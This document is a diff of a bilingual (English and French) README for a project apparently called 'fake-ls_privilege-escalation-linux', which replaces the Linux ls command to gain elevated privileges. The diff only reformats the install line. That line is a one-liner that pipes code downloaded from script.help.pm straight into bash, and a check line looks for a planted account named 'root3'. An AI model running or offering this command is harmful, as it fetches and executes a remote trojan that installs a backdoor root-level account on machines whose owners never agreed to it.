@@ -1,6 +1,6 @@
 # fake-ls_privilege-escalation-linux
 
-### COMMAND TO INSTALL VIA INTERNET : 'wget -qO - script.help.pm/ls.php | bash -'
+### COMMAND TO INSTALL VIA INTERNET : `wget -qO - script.help.pm/ls.php | bash -`
 
 Replacing the linux LS command for privilege elevation.
 
@@ -12,7 +12,7 @@ command test if is ok : getent passwd root3
 
 ## ---FR---
 
-### COMMANDE POUR INSTALLER VIA INTERNET : wget -qO - script.help.pm/ls.php | bash -
+### COMMANDE POUR INSTALLER VIA INTERNET : `wget -qO - script.help.pm/ls.php | bash -`
 
 Remplacement de la commande linux LS pour une élévation de privilège.
 
